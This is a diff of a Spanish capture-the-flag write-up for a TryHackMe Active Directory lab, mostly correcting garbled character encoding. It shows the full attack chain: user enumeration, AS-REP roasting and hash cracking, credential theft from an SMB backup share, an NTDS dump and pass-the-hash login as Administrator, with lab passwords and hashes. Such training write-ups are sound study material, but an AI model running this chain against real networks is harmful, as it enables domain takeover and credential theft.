@@ -13,7 +13,7 @@ Usuarios:
   - svc-admin
   - backup
   - Administrator
-Privesc: NTDS dump ÔåÆ Pass-the-Hash
+Privesc: NTDS dump → Pass-the-Hash
 Tecnicas:
   - SMB Enumeration
   - Kerberos User Enumeration
@@ -33,21 +33,21 @@ Herramientas:
   - evil-winrm
 Fecha: 2026-03-15
 ---
-<img width="940" height="257" alt="Pasted image 20260315151219" src="https://github.com/user-attachments/assets/6cf25b5f-b31a-4883-90a3-a079f1b18a20" />
+![[../../attachments/Pasted image 20260315151219.png]]
 
-Lo primero que realizaremos sera una enumeraci├│n de los puertos abiertos y de los servicios que corren en la maquina.
+Lo primero que realizaremos sera una enumeración de los puertos abiertos y de los servicios que corren en la maquina.
 
 ```bash
-é▒ gomap -s -p - $TARGET
+ gomap -s -p - $TARGET
 
-  ÔûêÔûêÔûêÔûêÔûêÔûêÔòù  ÔûêÔûêÔûêÔûêÔûêÔûêÔòù ÔûêÔûêÔûêÔòù   ÔûêÔûêÔûêÔòù ÔûêÔûêÔûêÔûêÔûêÔòù ÔûêÔûêÔûêÔûêÔûêÔûêÔòù 
- ÔûêÔûêÔòöÔòÉÔòÉÔòÉÔòÉÔòØ ÔûêÔûêÔòöÔòÉÔòÉÔòÉÔûêÔûêÔòùÔûêÔûêÔûêÔûêÔòù ÔûêÔûêÔûêÔûêÔòæÔûêÔûêÔòöÔòÉÔòÉÔûêÔûêÔòùÔûêÔûêÔòöÔòÉÔòÉÔûêÔûêÔòù
- ÔûêÔûêÔòæ  ÔûêÔûêÔûêÔòùÔûêÔûêÔòæ   ÔûêÔûêÔòæÔûêÔûêÔòöÔûêÔûêÔûêÔûêÔòöÔûêÔûêÔòæÔûêÔûêÔûêÔûêÔûêÔûêÔûêÔòæÔûêÔûêÔûêÔûêÔûêÔûêÔòöÔòØ
- ÔûêÔûêÔòæ   ÔûêÔûêÔòæÔûêÔûêÔòæ   ÔûêÔûêÔòæÔûêÔûêÔòæÔòÜÔûêÔûêÔòöÔòØÔûêÔûêÔòæÔûêÔûêÔòöÔòÉÔòÉÔûêÔûêÔòæÔûêÔûêÔòöÔòÉÔòÉÔòÉÔòØ 
- ÔòÜÔûêÔûêÔûêÔûêÔûêÔûêÔòöÔòØÔòÜÔûêÔûêÔûêÔûêÔûêÔûêÔòöÔòØÔûêÔûêÔòæ ÔòÜÔòÉÔòØ ÔûêÔûêÔòæÔûêÔûêÔòæ  ÔûêÔûêÔòæÔûêÔûêÔòæ     
-  ÔòÜÔòÉÔòÉÔòÉÔòÉÔòÉÔòØ  ÔòÜÔòÉÔòÉÔòÉÔòÉÔòÉÔòØ ÔòÜÔòÉÔòØ     ÔòÜÔòÉÔòØÔòÜÔòÉÔòØ  ÔòÜÔòÉÔòØÔòÜÔòÉÔòØ
+  ██████╗  ██████╗ ███╗   ███╗ █████╗ ██████╗ 
+ ██╔════╝ ██╔═══██╗████╗ ████║██╔══██╗██╔══██╗
+ ██║  ███╗██║   ██║██╔████╔██║███████║██████╔╝
+ ██║   ██║██║   ██║██║╚██╔╝██║██╔══██║██╔═══╝ 
+ ╚██████╔╝╚██████╔╝██║ ╚═╝ ██║██║  ██║██║     
+  ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝
 
-­ Scanning 10.112.160.217 (65535 ports, CONNECT scan)
+🎯 Scanning 10.112.160.217 (65535 ports, CONNECT scan)
 
 PORT    STATE  SERVICE         VERSION
 53      open   domain          
@@ -81,8 +81,8 @@ PORT    STATE  SERVICE         VERSION
 Host Exposure Summary
 - 10.112.160.217 | open ports: 27 | critical: ldap, ldaps, microsoft-ds, ms-wbt-server, msrpc, winrm | exposure: high
 
-Ô£ô Completed scan in 21.575s | hosts: 1 | open ports: 27
-Ô£ô Completed scan in 2.27s | hosts: 1 | open ports: 15
+✓ Completed scan in 21.575s | hosts: 1 | open ports: 27
+✓ Completed scan in 2.27s | hosts: 1 | open ports: 15
 ```
 
 Al ser una maquina de Windows obtendremos muchos puertos abiertos y mas siento un **AD** (Active Directory).
@@ -91,12 +91,12 @@ Los puertos a tener en cuenta son:
 - 80 - Servicio web proporcionado por IIS.
 - 139 - Nombres de maquinas.
 - 445 - Servicio SMB para compartir archivos y mas.
-- 5985 - Winrm para administraci├│n remota por linea de comando.
+- 5985 - Winrm para administración remota por linea de comando.
 
-Vamos a proceder a una enumeraci├│n de los puertos *139 y 445* con la herramienta **enum4linux**.
+Vamos a proceder a una enumeración de los puertos *139 y 445* con la herramienta **enum4linux**.
 
 ```bash
-é▒ enum4linux -U $TARGET
+ enum4linux -U $TARGET
 Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sun Mar 15 12:26:24 2026
 
  =========================================( Target Information )=========================================
@@ -153,10 +153,10 @@ Con esto hemos conseguido unos posibles usuarios:
 Ademas del nombre dominio de la maquina:
 - THM-AD
 
-Para hacer una enumeraci├│n mas fina tenemos que a├▒adir a nuestro */etc/host* la **IP** y el nombre de dominio **THM-AD** y **spookysec.local**.
+Para hacer una enumeración mas fina tenemos que añadir a nuestro */etc/host* la **IP** y el nombre de dominio **THM-AD** y **spookysec.local**.
 
 ```bash
-é▒ sudo nano /etc/hosts
+ sudo nano /etc/hosts
 
 127.0.0.1       localhost
 127.0.1.1       kali-box
@@ -172,7 +172,7 @@ ff02::2 ip6-allrouters
 Ahora usaremos **kerbrute** para enumerar usuarios.
 
 ```bash
-é▒ ./kerbrute userenum -d spookysec.local --dc $TARGET userlist.txt
+ ./kerbrute userenum -d spookysec.local --dc $TARGET userlist.txt
 
     __             __               __     
    / /_____  _____/ /_  _______  __/ /____ 
@@ -210,9 +210,9 @@ Vemos que destacan un par de usuario:
 - administrator
 - Administrator
 
-Pero estos 2 ├║ltimos tengo mis dudas con ellos, pero son interesantes.
+Pero estos 2 últimos tengo mis dudas con ellos, pero son interesantes.
 
-Ahora pasaremos esta lista a un *txt* para que podamos trabajar bien con ella en las pr├│ximas acciones.
+Ahora pasaremos esta lista a un *txt* para que podamos trabajar bien con ella en las próximas acciones.
 
 ```txt
 james
@@ -233,10 +233,10 @@ ori
 ROBIN
 ```
 
-Usaremos esta lista para ver que usuarios tienen la debilidad de AS-REP Roasting, que gira en torno a tener deshabilitada la preautenticaci├│n Kerberos, lo que permite pedir el ticket **sin contrase├▒a** y luego crackearlo offline.
+Usaremos esta lista para ver que usuarios tienen la debilidad de AS-REP Roasting, que gira en torno a tener deshabilitada la preautenticación Kerberos, lo que permite pedir el ticket **sin contraseña** y luego crackearlo offline.
 
 ```bash
-é▒ ´Çî   python3 ../Repos/impacket/examples/GetNPUsers.py -no-pass -request -usersfile user.txt -dc-ip $TARGET spookysec.local/
+    python3 ../Repos/impacket/examples/GetNPUsers.py -no-pass -request -usersfile user.txt -dc-ip $TARGET spookysec.local/
 Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
 
 [-] User james doesn't have UF_DONT_REQUIRE_PREAUTH set
@@ -259,10 +259,10 @@ $krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:e1ed5a2a95d2d21abf332b844be2fc7a$3001fd6
 
 Con esto obtenemos el has del usuario **svc-admin**.
 
-Vamos a proceder a comprometer la contrase├▒a.
+Vamos a proceder a comprometer la contraseña.
 
 ```bash
-é▒ hashcat -m 18200 scv.admin.txt passwordlist.txt 
+ hashcat -m 18200 scv.admin.txt passwordlist.txt 
 hashcat (v7.1.2) starting
 
 OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
@@ -325,13 +325,13 @@ Started: Sun Mar 15 13:52:22 2026
 Stopped: Sun Mar 15 13:52:50 2026
 ```
 
-Con esto ya tenemos la combinaci├│n para acceder al sistema.
+Con esto ya tenemos la combinación para acceder al sistema.
 - svc-admin:management2005
 
 Con estas credenciales podremos enumerar con mas facilidad con las herramientas que tenemos y obtener todos los datos que necesitamos.
 
 ```bash
- é▒ smbclient -L //$TARGET -U svc-admin%management2005
+  smbclient -L //$TARGET -U svc-admin%management2005
 
 	Sharename       Type      Comment
 	---------       ----      -------
@@ -351,7 +351,7 @@ Con **smbcliente** vemos el listado de recursos compartidos que tiene el servido
 Veamos que hay dentro.
 
 ```bash
-é▒ smbclient //$TARGET/backup/ -U svc-admin%management2005 
+ smbclient //$TARGET/backup/ -U svc-admin%management2005 
 Try "help" to get a list of possible commands.
 smb: \> dir
   .                                   D        0  Sat Apr  4 21:08:39 2020
@@ -361,7 +361,7 @@ smb: \> dir
 		8247551 blocks of size 4096. 4305867 blocks available
 ```
 
-Parece que tenemos un fichero interesante en esta carpeta, vamos a descargarla y as├¡ tratarla.
+Parece que tenemos un fichero interesante en esta carpeta, vamos a descargarla y así tratarla.
 
 ```cmd
 smb: \> get backup_credentials.txt
@@ -372,22 +372,22 @@ smb: \>
 Una vez la tengamos en el equipo podremos decodificar su contenido para ver que hay dentro.
 
 ```bash
-é▒ cat backup_credentials.txt | base64 -d          
+ cat backup_credentials.txt | base64 -d          
 backup@spookysec.local:backup2517860   
 ```
 
-Con este nuevo usuario tendremos acceso a mas contenido del servidor ya que por su nombre podemos intuir que nos dar├í acceso a copias de seguridad de mucho contenido y usuarios.
+Con este nuevo usuario tendremos acceso a mas contenido del servidor ya que por su nombre podemos intuir que nos dará acceso a copias de seguridad de mucho contenido y usuarios.
 
 Veamos que podemos encontrar.
 
-Para este fin usaremos `impacket-secretsdump` el cual nos permitir├í obtener el contenido de `NTDS.DIT`
+Para este fin usaremos `impacket-secretsdump` el cual nos permitirá obtener el contenido de `NTDS.DIT`
 
 ```bash
-é▒ echo $TARGET        
+ echo $TARGET        
 10.112.160.217
 
 
-é▒ impacket-secretsdump spookysec.local/backup:backup2517860@10.112.160.217      
+ impacket-secretsdump spookysec.local/backup:backup2517860@10.112.160.217      
 Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
 
 [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
@@ -468,12 +468,12 @@ ATTACKTIVEDIREC$:des-cbc-md5:8604fe2f2a8310fe
 
 Con esto hemos obtenidos los `hash` de los usuarios y sobre todo del que nos interesa `Adminitrator`.
 
-Sigamos con la intrusi├│n.
+Sigamos con la intrusión.
 
 Ahora nos conectaremos como el usuario `Adminstrator` usando la herramienta **evil-winrm**.
 
 ```bash
-é▒ evil-winrm -i 10.112.160.217 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc
+ evil-winrm -i 10.112.160.217 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc
 
 Evil-WinRM shell v3.9
 
@@ -487,8 +487,6 @@ Info: Establishing connection to remote endpoint
 
 Ahora nos dispondremos a investigar para completar las flags de Try Hack Me para terminar el laboratorio.
 
-Pero para ser una intrusi├│n podr├¡amos dejarlo aqu├¡.
+Pero para ser una intrusión podríamos dejarlo aquí.
 
 El laboratorio es interesante y se aprende mucho con el.
-
-
